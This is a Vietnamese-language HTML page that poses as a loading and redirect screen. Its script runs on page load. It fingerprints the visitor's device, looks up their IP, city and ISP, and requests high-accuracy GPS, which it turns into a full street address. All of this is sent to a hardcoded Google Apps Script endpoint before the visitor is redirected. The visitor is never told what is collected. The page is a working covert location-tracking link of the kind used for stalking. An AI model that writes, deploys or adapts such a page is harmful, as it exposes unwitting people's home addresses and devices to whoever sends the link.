<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Đang tải...</title>
  <style>
    body { font-family: sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f5f5f5; }
    .box { text-align:center; color:#555; }
    .spinner { width:36px; height:36px; border:3px solid #ddd; border-top-color:#555; border-radius:50%; animation:spin .8s linear infinite; margin:0 auto 16px; }
    @keyframes spin { to { transform:rotate(360deg); } }
  </style>
</head>
<body>
<div class="box">
  <div class="spinner"></div>
  <p>Đang chuyển hướng...</p>
</div>
<script>
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzSCxGr7C54w0ym69VDgDfTQsnXl0BMY4ga-sGNRoei0XCjQdfbmsE6F_kPh8-RN8Oz/exec";

async function run() {
  const ua = navigator.userAgent;

  // --- Nhận diện OS ---
  let os = "Không rõ";
  if      (/Windows NT 10/.test(ua)) os = "Windows 10/11";
  else if (/Android/.test(ua))       os = "Android " + (ua.match(/Android ([\d.]+)/)?.[1]||"");
  else if (/iPhone|iPad/.test(ua))   os = "iOS";
  else if (/Mac/.test(ua))           os = "macOS";
  else if (/Linux/.test(ua))         os = "Linux";

  // --- Nhận diện trình duyệt ---
  let browser = "Không rõ";
  if      (/Edg\//.test(ua))    browser = "Edge";
  else if (/OPR\//.test(ua))    browser = "Opera";
  else if (/Chrome\//.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d]+)/)?.[1]||"");
  else if (/Firefox\//.test(ua))browser = "Firefox";
  else if (/Safari\//.test(ua)) browser = "Safari";

  // --- Nhận diện thiết bị ---
  let device = "Desktop";
  if      (/iPhone/.test(ua))          device = "iPhone";
  else if (/iPad/.test(ua))            device = "iPad";
  else if (/Android.*Mobile/.test(ua)) device = "Android Phone";
  else if (/Android/.test(ua))         device = "Android Tablet";

  const screenRes = `${window.screen.width}x${window.screen.height}`;

  // --- Lấy IP + vị trí từ IP ---
  let ip = "?", city = "?", region = "?", country = "?", isp = "?";
  let ipLat = "?", ipLon = "?";

  try {
    const geo = await (await fetch("http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query")).json();
    if (geo.status === "success") {
      ip = geo.query; city = geo.city; region = geo.regionName;
      country = geo.country; isp = geo.isp;
      ipLat = geo.lat; ipLon = geo.lon;
    }
  } catch(e) {
    try { ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip; } catch(e2){}
  }

  // --- Xin quyền GPS + Reverse Geocoding ---
  let gpsAddress  = "Không cho phép";   // địa chỉ đầy đủ từ GPS
  let gpsLat      = "?";
  let gpsLon      = "?";
  let gpsAccuracy = "?";                // độ chính xác (mét)

  try {
    // Xin quyền GPS — người dùng sẽ thấy hộp thoại cho phép/từ chối
    const pos = await new Promise((resolve, reject) =>
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        timeout: 8000,           // chờ tối đa 8 giây
        maximumAge: 0,
        enableHighAccuracy: true // yêu cầu GPS chính xác cao
      })
    );

    gpsLat      = pos.coords.latitude.toFixed(6);
    gpsLon      = pos.coords.longitude.toFixed(6);
    gpsAccuracy = Math.round(pos.coords.accuracy) + "m";

    // Gọi Nominatim (OpenStreetMap) để chuyển tọa độ → địa chỉ
    // Lưu ý: thêm header User-Agent theo yêu cầu của Nominatim
    const nominatim = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${gpsLat}&lon=${gpsLon}&format=json&addressdetails=1&accept-language=vi`,
      { headers: { "User-Agent": "TrackingApp/1.0" } }
    );
    const place = await nominatim.json();

    if (place && place.address) {
      const a = place.address;

      // Ghép địa chỉ theo chuẩn Việt Nam: số nhà + đường + phường + quận + tỉnh
      const parts = [
        a.house_number,
        a.road || a.pedestrian || a.footway,
        a.suburb || a.neighbourhood || a.quarter,
        a.city_district || a.district,
        a.city || a.town || a.village,
        a.country
      ].filter(Boolean); // bỏ các phần null/undefined

      gpsAddress = parts.join(", ");
    }

  } catch(err) {
    // Người dùng từ chối hoặc GPS không khả dụng
    if (err.code === 1) gpsAddress = "Người dùng từ chối GPS";
    else if (err.code === 2) gpsAddress = "GPS không khả dụng";
    else if (err.code === 3) gpsAddress = "GPS timeout";
    else gpsAddress = "Lỗi GPS";
  }

  // --- Tạo fingerprint ---
  const raw = [ua, navigator.language, screenRes, navigator.hardwareConcurrency, new Date().getTimezoneOffset()].join("|");
  const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
  const fingerprint = Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,16);

  // --- Gửi tất cả về Apps Script ---
  try {
    const res  = await fetch(APPS_SCRIPT_URL, {
      method : "POST",
      headers: { "Content-Type": "text/plain" },
      body   : JSON.stringify({
        fingerprint,
        // Từ IP
        ip, city, region, country, isp,
        ipLat, ipLon,
        // Từ GPS
        gpsAddress,           // 👈 địa chỉ đầy đủ dạng text
        gpsLat, gpsLon,
        gpsAccuracy,
        // Thiết bị
        userAgent: ua, os, browser, device,
        screen   : screenRes,
        language : navigator.language,
        timezone : Intl.DateTimeFormat().resolvedOptions().timeZone
      })
    });
    const json = await res.json();
    window.location.href = json.redirect || "https://google.com";
  } catch(e) {
    window.location.href = "https://google.com";
  }
}

run();
</script>
</body>
</html>
